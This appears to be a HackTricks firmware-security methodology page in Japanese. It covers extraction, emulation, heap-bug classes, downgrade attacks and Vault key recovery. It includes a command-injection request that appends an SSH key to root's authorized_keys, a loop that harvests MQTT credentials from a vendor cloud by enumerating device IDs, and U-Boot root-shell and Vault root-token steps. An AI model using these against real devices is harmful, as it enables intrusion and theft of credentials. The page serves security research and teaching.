# Firmware 解析

{{#include ../../banners/hacktricks-training.md}}

## **Introduction**

### 関連リソース


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware は、hardware コンポーネントとユーザーが操作する software 間の通信を管理および仲介することで、device が正しく動作できるようにする essential software です。Firmware は permanent memory に保存されるため、device の電源が入った瞬間から重要な命令にアクセスでき、最終的に operating system の起動につながります。Firmware の調査と、必要に応じた変更は、security vulnerabilities を特定するうえで critical な手順です。<sup>[[2]](#references)[[3]](#references)</sup>

## **Gathering Information**

**情報収集** は、device の構成と使用されている technologies を理解するための critical な初期段階です。このプロセスでは、次のデータを収集します。

- CPU architecture と、それが実行する operating system
- Bootloader の詳細
- Hardware layout と datasheets
- Codebase の metrics と source locations
- External libraries と license types
- Update histories と regulatory certifications
- Architectural diagrams と flow diagrams
- Security assessments と特定された vulnerabilities

この目的では、**open-source intelligence (OSINT)** tools が非常に有用です。また、利用可能な open-source software components を、manual および automated review processes によって分析することも有効です。[Coverity Scan](https://scan.coverity.com) や [Semmle’s LGTM](https://lgtm.com/#explore) などの tools は、potential issues の発見に活用できる無料の static analysis を提供します。

## **Acquiring the Firmware**

Firmware はさまざまな方法で取得でき、それぞれ complexity の level が異なります。

- Source（developers、manufacturers）から**直接**取得する
- 提供された instructions から**build**する
- Official support sites から**download**する
- ホストされている Firmware files を見つけるために **Google dork** queries を使用する
- [S3Scanner](https://github.com/sa7mon/S3Scanner) などの tools を使って **cloud storage** に直接アクセスする
- man-in-the-middle techniques によって **updates** を intercept する
- **UART**、**JTAG**、**PICit** などの connections を介して device から **extract** する
- Device communication 内の update requests を **sniff** する
- **hardcoded update endpoints** を特定して使用する
- Bootloader または network から **dump** する
- 他の方法がすべて失敗した場合、適切な hardware tools を使用して storage chip を **remove and read** する

### UART-only logs: flash 内の U-Boot env による root shell の強制

UART RX が無視される場合（logs のみ）、**U-Boot environment blob** を offline で**編集**することで、init shell を強制できます。<sup>[[6]](#references)</sup>

1. SOIC-8 clip と programmer（3.3V）を使用して SPI flash を dump します。
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. U-Boot env partition を特定し、`bootargs` を編集して `init=/bin/sh` を含め、**U-Boot env CRC32** を blob に対して再計算します。
3. env partition のみを reflash して reboot します。UART 上に shell が表示されるはずです。

これは、bootloader shell が無効化されている一方で、external flash access によって env partition が writable な embedded devices で役立ちます。

## Firmware の分析

**Firmware を取得した**ので、それをどのように扱うべきか把握するために、Firmware に関する情報を extract する必要があります。そのために使用できるさまざまな tools があります。
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
これらのツールであまり情報が見つからない場合は、`binwalk -E <bin>` を使ってイメージの **entropy** を確認してください。entropy が低い場合、暗号化されている可能性は低いです。entropy が高い場合、暗号化されている可能性があります（または何らかの方法で圧縮されています）。

さらに、これらのツールを使用して **firmware 内に埋め込まれたファイル** を抽出できます：


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

または [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) を使用してファイルを調査できます。

### ファイルシステムの取得

先ほど説明した `binwalk -ev <bin>` などのツールを使えば、**ファイルシステムを抽出**できているはずです。\
通常、Binwalk はファイルシステムの種類を名前とする **folder** 内に抽出します。通常、次のいずれかです：squashfs、ubifs、romfs、rootfs、jffs2、yaffs2、cramfs、initramfs。

#### ファイルシステムの手動抽出

場合によっては、binwalk の signatures にファイルシステムの **magic byte** が含まれていないことがあります。この場合、binwalk を使用してファイルシステムの offset を特定し、バイナリから圧縮されたファイルシステムを **carve** したうえで、以下の手順に従い、その種類に応じてファイルシステムを **手動で抽出**します。
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Squashfs filesystem をcarveするには、以下の **dd command** を実行します。
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
また、以下のコマンドを実行することもできます。

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs（上記の例で使用）

`$ unsquashfs dir.squashfs`

その後、ファイルは "`squashfs-root`" ディレクトリ内に配置されます。

- CPIO archive ファイル

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 filesystem の場合

`$ jefferson rootfsfile.jffs2`

- NAND flash を使用する ubifs filesystem の場合

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Firmware の分析

Firmware を取得したら、その構造と潜在的な脆弱性を理解するために、詳細に解析することが重要です。このプロセスでは、さまざまなツールを使用して firmware image を分析し、そこから有用なデータを抽出します。

### 初期分析ツール

binary file（`<bin>` と表記）の初期調査用に、一連のコマンドが用意されています。これらのコマンドは、file type の特定、strings の抽出、binary data の分析、partition と filesystem の詳細の把握に役立ちます。
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
イメージの暗号化状態を評価するには、`binwalk -E <bin>` を使用して **entropy** を確認します。低いエントロピーは暗号化されていない可能性を示し、高いエントロピーは暗号化または圧縮されている可能性を示します。

**埋め込みファイル**を抽出するには、**file-data-carving-recovery-tools** のドキュメントや、ファイル検査用の **binvis.io** などのツールやリソースが推奨されます。

### ファイルシステムの抽出

`binwalk -ev <bin>` を使用すると、通常はファイルシステムを抽出できます。多くの場合、ファイルシステムの種類（例: squashfs、ubifs）にちなんだ名前のディレクトリに抽出されます。ただし、magic bytes が存在しないため **binwalk** がファイルシステムの種類を認識できない場合は、手動での抽出が必要です。これには、`binwalk` を使用してファイルシステムの offset を特定し、その後 `dd` コマンドを使ってファイルシステムを carve out します：
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
その後、ファイルシステムの種類（例: squashfs、cpio、jffs2、ubifs）に応じて、内容を手動で抽出するために異なるコマンドを使用します。

### ファイルシステム分析

ファイルシステムを抽出したら、security flawの検索を開始します。安全でないネットワークデーモン、hardcoded credentials、API endpoints、update serverの機能、未コンパイルのコード、startup scripts、offline analysis用のcompiled binariesに注目します。

**主な場所**と、検査対象となる**項目**は次のとおりです。

- ユーザー credentials の **etc/shadow** と **etc/passwd**
- **etc/ssl** 内の SSL certificates と keys
- 潜在的な vulnerabilities がないか、configuration files と script files
- さらなる analysis のための embedded binaries
- 一般的な IoT device の web servers と binaries

filesystem 内の sensitive information と vulnerabilities の発見には、いくつかの tools が役立ちます。

- sensitive information の検索には [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) と [**Firmwalker**](https://github.com/craigz28/firmwalker)
- 包括的な firmware analysis には [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)
- static and dynamic analysis には [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer)、[**ByteSweep**](https://gitlab.com/bytesweep/bytesweep)、[**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go)、[**EMBA**](https://github.com/e-m-b-a/emba)

### Compiled Binaries の Security Checks

filesystem 内で見つかった source code と compiled binaries は、vulnerabilities がないか精査する必要があります。Unix binaries 用の **checksec.sh** や Windows binaries 用の **PESecurity** などの tools は、exploit可能な保護されていない binaries の特定に役立ちます。

## 生成された URL tokens を介した cloud config と MQTT credentials の取得

多くの IoT hubs は、次のような cloud endpoint から device ごとの configuration を取得します。<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

firmware analysis 中に、`<token>` が hardcoded secret を使って device ID から locally に derived されていることが判明する場合があります。例えば次のようになります。

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

この設計では、deviceId と STATIC_KEY を知っている anyone が URL を再構築して cloud config を取得できます。その結果、plaintext MQTT credentials や topic prefixes が明らかになることがよくあります。

Practical workflow:

1) UART boot logs から deviceId を抽出する

- 3.3V UART adapter（TX/RX/GND）を接続し、logs を取得します。
```bash
picocom -b 115200 /dev/ttyUSB0
```
- cloud config URL pattern と broker address を出力している行を探します。例:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) firmware から STATIC_KEY と token algorithm を復元する

- バイナリを Ghidra/radare2 に読み込み、config path（"/pf/"）または MD5 の使用箇所を検索する。
- algorithm（例：MD5(deviceId||STATIC_KEY)）を確認する。
- Bash で token を導出し、digest を大文字にする：
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) cloud config と MQTT credentials の収集

- URL を組み立て、curl で JSON を取得し、jq で parse して secrets を抽出します:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) 平文 MQTT と弱い topic ACLs の悪用（存在する場合）

- 回収した認証情報を使用して maintenance topics を subscribe し、機密性の高いイベントを探す：
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) 予測可能な device ID を列挙する（大規模に、認可を得て）

- 多くの ecosystem では、vendor OUI/product/type byte の後に連番の suffix が埋め込まれています。
- 候補 ID を反復処理し、token を導出して config をプログラムで取得できます:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
注記
- mass enumerationを試みる前に、必ず明示的な許可を取得してください。
- 可能な場合は、target hardwareを変更せずにsecretを復元するため、emulationまたはstatic analysisを優先してください。


ファームウェアをemulationすることで、deviceの動作または個々のprogramの**dynamic analysis**が可能になります。このアプローチでは、hardwareやarchitectureへの依存性により問題が発生する場合がありますが、root filesystemまたは特定のbinaryを、Raspberry Piなどのarchitectureとendiannessが一致するdevice、または事前構築済みのvirtual machineに移行することで、さらなるtestingを実施できます。

### 個々のBinaryのEmulation

単一のprogramを調査する場合、programのendiannessとCPU architectureを特定することが重要です。

#### MIPS Architectureの例

MIPS architectureのbinaryをemulationするには、次のcommandを使用できます。
```bash
file ./squashfs-root/bin/busybox
```
また、必要なエミュレーションツールをインストールするには：
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
MIPS（big-endian）には `qemu-mips` を使用し、little-endian バイナリには `qemu-mipsel` を選択します。

#### ARM アーキテクチャのエミュレーション

ARM バイナリの場合もプロセスは同様で、`qemu-arm` エミュレーターを使用してエミュレーションを行います。

### フルシステムエミュレーション

[Firmadyne](https://github.com/firmadyne/firmadyne)、[Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) などのツールは、ファームウェア全体のエミュレーションを実現し、プロセスを自動化するとともに、動的解析を支援します。

## 実践における動的解析

この段階では、実機またはエミュレートされたデバイス環境を使用して解析を行います。OS とファイルシステムへの shell access を維持することが重要です。エミュレーションではハードウェアとのインタラクションを完全には再現できない場合があり、エミュレーションを再起動しなければならないこともあります。解析では、ファイルシステムを再確認し、公開されている Web ページや network service を exploit し、bootloader の脆弱性を調査します。潜在的な backdoor 脆弱性を特定するには、ファームウェアの integrity test が重要です。

## Runtime Analysis のテクニック

Runtime analysis では、gdb-multiarch、Frida、Ghidra などのツールを使用して、プロセスまたはバイナリの動作環境内でインタラクションを行い、breakpoint の設定や fuzzing などのテクニックによって脆弱性を特定します。

完全な debugger がない embedded target では、**静的リンクされた `gdbserver` をデバイスにコピーし、リモートで attach します**。<sup>[[6]](#references)</sup>
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Zigbee / radio-co-processor message mapping

IoT hub では、RF stack が **radio MCU** と Linux userland process の間で分割されていることがよくあります。実用的な workflow は、その経路をマッピングすることです:<sup>[[8]](#references)</sup>

1. **RF frame** on the air
2. **controller-side parser** on the radio MCU
3. **serial/UART text or TLV protocol** forwarded to Linux (for example `/dev/tty*`)
4. **application dispatcher** in the main daemon
5. **protocol-specific handler / state machine**

この architecture では、reversing target が1つではなく2つになります。controller が binary radio frame を `Group,Command,arg1,arg2,...` のような textual protocol に変換する場合は、以下を特定します。

- **message groups** と dispatch tables
- どの message が **network** から送信可能で、どれが controller 自体から送信されるか
- 正確な **manufacturer-specific discriminator fields**（例えば Zigbee の `manufacturer_code` と custom `cluster_command`）
- **commissioning**、discovery、または firmware/model download phases の間だけ到達可能な handler

Zigbee では、pairing traffic を capture し、target が依然として default **Link Key** `ZigBeeAlliance09` に依存しているか確認します。依存している場合、commissioning traffic の sniffing により **Network Key** が露出する可能性があります。Zigbee 3.0 install codes はこの exposure を低減するため、テスト対象 device が実際にそれを強制しているかを記録してください。

### Manufacturer-specific protocol handlers and FSM-gated reachability

Vendor-specific Zigbee/ZCL commands は、standardized clusters よりも優れた target になることがよくあります。これらは、十分に battle-tested されていない **custom parsing code** と内部 **FSMs** に入力されるためです。<sup>[[8]](#references)</sup>

実用的な workflow:

- command dispatcher を reverse し、**vendor-only handler** を見つける。
- **FSM state**、**event**、**check**、**action**、**next-state** tables を復元する。
- 自動的に advance する **transitional states** と、最終的に attacker-controlled state を reset または free する retry/error branches を特定する。
- buggy handler が常に到達可能だと想定せず、daemon を vulnerable state に移行させるために必要な正規 protocol exchanges を確認する。

Timing-sensitive protocols では、Python framework からの packet replay は遅すぎる可能性があります。より信頼性の高い approach は、vendor-grade stack を使用して実 hardware（例えば **nRF52840**）上で legitimate device を emulate することです。これにより、正しい **endpoints**、**attributes**、commissioning timing を expose できます。

### Embedded daemons における fragmented-download bug class

**fragmented blob/model/configuration downloads** では、繰り返し現れる firmware bug class があります:<sup>[[8]](#references)</sup>

1. **first fragment** (`offset == 0`) が `ctx->total_size` を保存し、`malloc(total_size)` を実行する。
2. 後続の fragments は、`packet_total_size >= offset + chunk_len` のような attacker-controlled な **packet-local** fields のみを validate する。
3. copy は、元の allocated size に対する check なしに `memcpy(&ctx->buffer[offset], chunk, chunk_len)` を使用する。

これにより attacker は以下を送信できます。

- 小さい declared total size を持つ、最初の valid fragment。これにより小さい heap allocation を強制する。
- **expected offset** と、より大きな `chunk_len` を持つ後続 fragment。
- 新しい checks を満たしながら、元々 allocated された buffer を overflow させる forged packet-local size。

vulnerable path が commissioning logic の背後にある場合、malformed fragments を送信する前に、target を想定された model-download または blob-download state に移行させるための十分な **device emulation** を exploit に含める必要があります。

### Protocol-driven `free()` triggers

Embedded daemons では、heap metadata exploitation を trigger する最も簡単な方法は、「cleanup を待つ」ことではなく、protocol 自身の **error handling** を強制することです:<sup>[[8]](#references)</sup>

- malformed follow-up fragments を送信し、FSM を **retry** または **error** states に移行させる。
- retry threshold を超過させ、daemon に **context** を reset させて corrupted buffer を free させる。
- この予測可能な `free()` を使用し、process が無関係な理由で crash する前に allocator-side primitives を trigger する。

これは、embedded Linux の **musl/uClibc/dlmalloc-like** allocators に対して特に有用です。chunk metadata の corruption により、unlink/unbin logic を write primitive に変えられる可能性があるためです。安定した pattern は、real bin pointers を直ちに clobber して process を crash させるのではなく、**size field** を corrupt して、allocator traversal を overflow された buffer 内に配置した **fake chunks** へ redirect することです。

## Binary Exploitation and Proof-of-Concept

特定した vulnerabilities の PoC を開発するには、target architecture と lower-level languages による programming を深く理解する必要があります。Embedded systems では binary runtime protections は稀ですが、存在する場合は Return Oriented Programming (ROP) のような techniques が必要になることがあります。

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc は glibc と同様の fastbins を使用します。後続の large allocation が `__malloc_consolidate()` を trigger する可能性があるため、fake chunk は checks（sane size、`fd = 0`、および surrounding chunks が "in use" と認識されること）を通過できなければなりません。<sup>[[6]](#references)</sup>
- **Non-PIE binaries under ASLR:** ASLR が有効でも main binary が **non-PIE** であれば、binary 内の `.data/.bss` addresses は stable です。すでに valid heap chunk header に似た region を target にすることで、fastbin allocation を **function pointer table** 上に配置できます。
- **Parser-stopping NUL:** JSON が parse される際、payload 内の `\x00` は parsing を停止させながら、stack pivot/ROP chain 用の trailing attacker-controlled bytes を保持できます。
- **Shellcode via `/proc/self/mem`:** `open("/proc/self/mem")`、`lseek()`、`write()` を call する ROP chain により、known mapping 内に executable shellcode を配置して jump できます。

## Firmware Analysis 用の Prepared Operating Systems

[AttifyOS](https://github.com/adi0x90/attifyos) や [EmbedOS](https://github.com/scriptingxss/EmbedOS) のような operating systems は、必要な tools を備えた、firmware security testing 用の pre-configured environments を提供します。

## Firmware を分析するための Prepared OSs

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS は、Internet of Things (IoT) devices の security assessment と penetration testing を支援するための distro です。必要な tools がすべて load された pre-configured environment を提供することで、多くの時間を節約できます。
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): firmware security testing tools が preloaded された、Ubuntu 18.04 based の embedded security testing operating system です。

## Firmware Downgrade Attacks & Insecure Update Mechanisms

vendor が firmware images に対する cryptographic signature checks を実装している場合でも、**version rollback (downgrade) protection は頻繁に省略されます**。boot- または recovery-loader が embedded public key による signature のみを verify し、flash される image の *version*（または monotonic counter）を比較しない場合、attacker は **valid signature が付いた古い vulnerable firmware** を正規に install でき、patched vulnerabilities を再び有効化できます。<sup>[[4]](#references)</sup>

Typical attack workflow:

1. **古い signed image を取得する**
* vendor の public download portal、CDN、または support site から取得する。
* companion mobile/desktop applications から extract する（例: Android APK 内の `assets/firmware/`）。
* VirusTotal、Internet archives、forums などの third-party repositories から retrieve する。
2. exposed update channel を介して image を device に **upload または serve する**:
* Web UI、mobile-app API、USB、TFTP、MQTT など。
* 多くの consumer IoT devices は、Base64-encoded firmware blobs を受け付け、server-side で decode して recovery/upgrade を trigger する *unauthenticated* HTTP(S) endpoints を expose しています。
3. downgrade 後に、新しい release で patched された vulnerability を exploit する（例えば、後から追加された command-injection filter）。
4. persistence を獲得した後、detection を避けるために、必要に応じて latest image を flash し直すか updates を disable する。

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
脆弱な（ダウングレードされた）firmwareでは、`md5`パラメータがサニタイズされずにshell commandへ直接連結されるため、任意のcommandをinjectionできます（ここでは、SSH keyベースのroot accessを有効化しています）。後のfirmwareバージョンでは基本的な文字フィルターが導入されましたが、ダウングレード保護がないため、この修正は実質的に無効です。<sup>[[4]](#references)</sup>

### Mobile AppからのFirmware抽出

多くのvendorは、appがBluetooth/Wi-Fi経由でdeviceをupdateできるよう、companion mobile application内に完全なfirmware imageを同梱しています。これらのpackageは通常、`assets/fw/`や`res/raw/`などのpathにあるAPK/APEX内へ、暗号化されていない状態で保存されています。`apktool`、`ghidra`、あるいは単純な`unzip`などのtoolを使えば、physical hardwareに触れることなく、署名済みimageを取り出せます。<sup>[[4]](#references)</sup>
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### A/B slot設計におけるUpdater-only anti-rollback bypass

一部のvendorはanti-downgrade **ratchet**を実装していますが、それは*updater*のlogic内だけに存在します（たとえば、CAN上のUDS routine、recovery command、userspace OTA agentなど）。後段の**bootloader**がimageのsignature/CRCだけをcheckし、partition tableまたはslot metadataを信頼する場合、rollback protectionは依然としてbypass可能です。<sup>[[7]](#references)</sup>

典型的なweak design:

- Firmware metadataに、version descriptorと**security ratchet** / monotonic counterの両方が含まれている。
- Updaterはimageのratchetをpersistent storageに保存された値と比較し、より古いsigned imageをrejectする。
- Bootloaderはそのratchetを**parseせず**、boot前にheader、CRC、signatureだけをverifyする。
- Slot activationはpartition tableまたはper-slot generation counterに別途保存され、validatedされた正確なfirmware digestにcryptographically boundされていない。

これにより、dual-slot systemでは**validate-one-image / boot-another-image** primitiveが成立します。攻撃者がcurrent signed imageを使ってupdaterにslot Bを次回のboot targetとしてmarkさせ、その後reboot前にslot Bをoverwriteできる場合、bootloaderはすでにcommitされたslot metadataだけをtrustするため、downgraded imageをbootする可能性があります。

一般的なabuse pattern:

1. **current signed** firmwareをpassive slotにuploadし、通常のvalidation/switch routineを実行して、そのlayoutで該当slotをnext activeとしてmarkする。
2. **まだrebootしない**。同じsessionでslot-preparation/erase routineに再び入る。
3. stale boot-stateまたはstale slot-selection logicをabuseし、直前にpromoteされた**同じphysical slot**をupdaterにeraseさせる。
4. **older but still signed** firmwareをそのslotにwriteする。
5. ratchetをenforceするvalidation routineをskipし、直接rebootする。
6. Bootloaderはpromoteされたslotをselectし、signature/integrityだけをverifyしてold imageをbootする。

A/B update implementationをreverseするときに確認するポイント:

- Successful switch後にrefreshされない**boot-time flags**からslot selectionがderiveされていないか。
- **current committed layout**ではなくstale stateに基づいてslotをeraseする、`prepare_passive_slot()`形式のroutineがないか。
- **generation counter** / active flagだけをincrementし、validated image hashを保存しない`part_write_layout()`形式のfunctionがないか。
- Ratchet checkがuserspaceまたはupdater codeに実装されているが、ROM / bootloader / secure boot stageには実装されていないか。
- Eraseまたはrecovery routineが、slotのcontentをremoveしてrewriteした後も、そのslotをbootableとしてmarkしたままにしていないか。

### Update LogicのAssessing Checklist

* *update endpoint*のtransport/authenticationは十分にprotectされているか（TLS + authentication）？
* Flashing前にdeviceは**version numbers**または**monotonic anti-rollback counter**をcompareしているか？
* Imageはsecure boot chain内でverifyされているか（例: ROM codeがsignatureをcheckする）？
* **bootloaderはupdaterと同じratchetをenforce**しているか、それともsignature/CRCだけをcheckしているか？
* Slot activation metadataは**validated firmware digest/versionにbound**されているか、それともpromotion後にslotをmodifyできるか？
* Slot switchがsuccessfulになった後、deviceはrebootを強制されるか、それとも同じsessionで後続のupdate/erase routineに引き続き到達できるか？
* Userland codeは追加のsanity check（例: allowed partition map、model number）を実行するか？
* *partial*または*backup* update flowは同じvalidation logicをreuseしているか？

> 💡  上記のいずれかが欠けている場合、そのplatformはおそらくrollback attackに対してvulnerableです。

## Vulnerable firmware to practice

Firmwareのvulnerability発見をpracticeするには、以下のvulnerable firmware projectをstarting pointとして使用してください。

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Recovering firmware decryption keys from embedded KMS/Vault state

Update imageがsmall plaintext metadataとlarge high-entropy blobを組み合わせている場合、何かをbrute-forceする前にcontainer triageを行います:<sup>[[1]](#references)</sup>

- `hexdump`、`xxd`、`strings -tx`、`base64 -d`、`binwalk -E`を使用して、header、offset、line boundaryをdumpする。
- `Salted__`は通常OpenSSL `enc` formatを意味します。次の8 bytesがsaltで、残りのbytesがciphertextです。
- `256` bytesに正確にdecodeされるBase64 fieldは、random firmware password/session keyをwrapするRSA-2048 ciphertextを見ている強いhintです。
- 同じfile内にあるdetached PGP materialはauthenticityだけをprotectしていることが多く、それがconfidentiality mechanismだとassumeしないでください。

Static key hunting（`grep`、`strings`、PEM/PGP search）がfailした場合は、private keyだけをsearchするのではなく、**operational decrypt path**をreverseします。

- Updater / management binaryをdecompileし、encrypted blobをreadするcomponent、そのblobをunwrapするhelper/API、そしてrequestされるlogical key nameをtraceする。
- Extracted root filesystemでKMS state（`vault/`、`transit/`、`pkcs11`、`keystore`、`sealed-secrets`）に加え、unit fileとinit scriptをsearchする。
- Plaintextの`vault operator unseal ...`、recovery key、bootstrap token、またはlocal KMS auto-unseal scriptは、private-key materialと同等に扱う。

Applianceがoriginal Vault binaryとstorage backendをshipしている場合、Vault internalsをreimplementするよりも、そのenvironmentをreplayするほうが通常は容易です。
```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```
root を取得した cloned KMS 上で:

- isolated clone 内でのみ transit keys を exportable にする: `vault write transit/keys/<name>/config exportable=true`
- unwrap key を export する: `vault read transit/export/encryption-key/<name>`
- 復元した RSA key を、KMS が使用した正確な padding/hash の組み合わせで試す。PKCS#1 v1.5 decrypt の失敗や、デフォルトの OAEP decrypt の失敗だけでは、key が間違っているとは証明できない。多くの Vault-backed flow では SHA-256 を使用した OAEP が使われる一方、一般的な library のデフォルトは SHA-1 である。
- payload が `Salted__` で始まる場合は、AES-CBC decrypt を試す前に、vendor の OpenSSL KDF（`EVP_BytesToKey`、legacy appliance では MD5 が使われることが多い）を正確に再現する。

これにより、"encrypted firmware" はより一般的な問題になる: **appliance 側の operational keys を復元し、正確な unwrap + KDF parameters を offline で再現する**。

## Training and Certifications

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Claude で Firmware を Cracking: Senior-Level Skill、Junior-Level Autonomy](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Firmware Security Testing Methodology](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Practical IoT Hacking: Internet of Things を攻撃するための決定版ガイド](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [放棄された hardware の zero days を Exploiting – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [$20 の Smart Device によって自宅への Access を得た方法](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Tesla Wall Connector を charge port connector から Exploiting - Part 2: anti-downgrade の bypass](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Make it Blink: Philips Hue Bridge の Over-the-Air Exploitation](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
{{#include ../../banners/hacktricks-training.md}}
